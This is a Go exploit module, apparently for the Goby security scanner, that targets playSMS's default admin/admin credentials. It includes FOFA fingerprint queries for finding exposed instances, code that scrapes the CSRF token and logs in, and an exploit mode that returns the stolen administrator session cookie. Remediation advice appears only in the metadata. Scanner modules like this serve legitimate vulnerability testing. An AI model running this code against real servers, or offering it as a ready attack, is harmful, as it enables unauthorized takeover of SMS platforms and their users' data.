package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "playSMS default password vulnerability",
    "Description": "<p>playSMS is a free and open source SMS management software, which is a web interface for SMS gateway and bulk SMS service.</p><p>PlaySMS has a default password of admin/admin. An attacker can control the entire platform through the default password vulnerability and use administrator privileges to operate core functions.</p>",
    "Product": "playSMS",
    "Homepage": "https://playsms.org/",
    "DisclosureDate": "2023-03-07",
    "Author": "sunying",
    "FofaQuery": "body=\"index.php?app=main&inc=core_auth&route=login&op=login\" || title=\"playSMS\"",
    "GobyQuery": "body=\"index.php?app=main&inc=core_auth&route=login&op=login\" || title=\"playSMS\"",
    "Level": "2",
    "Impact": "<p>Attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "login",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "playSMS 默认口令漏洞",
            "Product": "playSMS",
            "Description": "<p>playSMS 是一款免费开源的短信管理软件，是短信网关和群发短信服务的网页界面。<br></p><p>playSMS 存在默认口令 admin/admin，攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能。<br></p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能。\t<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "playSMS default password vulnerability",
            "Product": "playSMS",
            "Description": "<p>playSMS is a free and open source SMS management software, which is a web interface for SMS gateway and bulk SMS service.</p><p>PlaySMS has a default password of admin/admin. An attacker can control the entire platform through the default password vulnerability and use administrator privileges to operate core functions.</p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>Attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-09-12",
    "PocId": "10836"
}`
	sendLoginPayloadGRYFFob33 := func(hostInfo *httpclient.FixUrl) (bool, string) {
		loginRequestConfig := httpclient.NewGetRequestConfig("/index.php?app=main&inc=core_auth&route=login")
		loginRequestConfig.VerifyTls = false
		loginRequestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, loginRequestConfig)
		if err != nil || (resp != nil && resp.StatusCode != 200) {
			return false, ""
		}
		reg, _ := regexp.Compile(`<input.+?name="X-CSRF-Token"\s+value="(.+?)">`)
		match := reg.FindStringSubmatch(resp.RawBody)
		if len(match) < 1 {
			return false, ""
		}
		cfgAdmin := httpclient.NewPostRequestConfig("/index.php?app=main&inc=core_auth&route=login&op=login")
		cfgAdmin.VerifyTls = false
		cfgAdmin.FollowRedirect = true
		cfgAdmin.Following = 2
		cfgAdmin.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfgAdmin.Header.Store("Cookie", resp.Cookie)
		cfgAdmin.Data = fmt.Sprintf(`X-CSRF-Token=%s&username=admin&password=admin`, match[1])
		responseAdmin, errAdmin := httpclient.DoHttpRequest(hostInfo, cfgAdmin)
		if errAdmin != nil {
			return false, ""
		}
		return responseAdmin != nil && responseAdmin.StatusCode == 200 && strings.Contains(responseAdmin.Utf8Html, "Logged in as admin"), resp.Cookie
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			success, _ := sendLoginPayloadGRYFFob33(hostInfo)
			if success {
				stepLogs.VulURL = hostInfo.Scheme() + "://admin:admin@" + hostInfo.HostInfo
			}
			return success
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "login" {
				success, cookie := sendLoginPayloadGRYFFob33(expResult.HostInfo)
				expResult.Success = success
				if success {
					expResult.Output = "Cookie: " + cookie
				} else {
					expResult.Output = "漏洞利用失败"
				}
			}
			return expResult
		},
	))
}
